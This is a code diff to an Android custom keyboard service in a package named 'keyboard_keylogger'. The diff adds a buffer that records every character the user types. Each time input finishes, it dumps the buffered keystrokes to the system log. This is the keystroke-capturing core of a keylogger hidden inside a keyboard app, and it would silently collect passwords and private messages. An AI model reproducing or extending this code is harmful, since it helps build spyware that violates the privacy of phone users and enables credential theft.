@@ -1,24 +1,33 @@
 package com.example.keyboard_keylogger;
 
-import android.content.Intent;
+
 import android.inputmethodservice.InputMethodService;
 import android.inputmethodservice.Keyboard;
 import android.inputmethodservice.KeyboardView;
-import android.os.IBinder;
 import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.InputConnection;
+import java.util.ArrayList;
 
 public class MyService extends InputMethodService implements KeyboardView.OnKeyboardActionListener{
 
     private KeyboardView kv;
     private Keyboard keyboard;
-
+    private ArrayList<Character> keyBuffer;
     private boolean isCaps = false;
 
+    @Override
+    public void onFinishInputView(boolean finishingInput) {
+        System.out.println("onFinishInputView called");
+        System.out.println(keyBuffer);
+        keyBuffer.clear();
+        super.onFinishInputView(finishingInput);
+    }
 
     @Override
     public View onCreateInputView(){
+        System.out.println("Input method created!");
+        keyBuffer = new ArrayList<>();
         kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard,null);
         keyboard = new Keyboard(this,R.xml.qwerty);
         kv.setKeyboard(keyboard);
@@ -40,6 +49,8 @@ public class MyService extends InputMethodService implements KeyboardView.OnKeyb
     public void onKey(int i, int[] ints) {
         InputConnection ic = getCurrentInputConnection();
         //playClick(i);
+
+        keyBuffer.add((char)(i));
         System.out.println(i);
         switch (i) {
             case Keyboard.KEYCODE_DELETE:
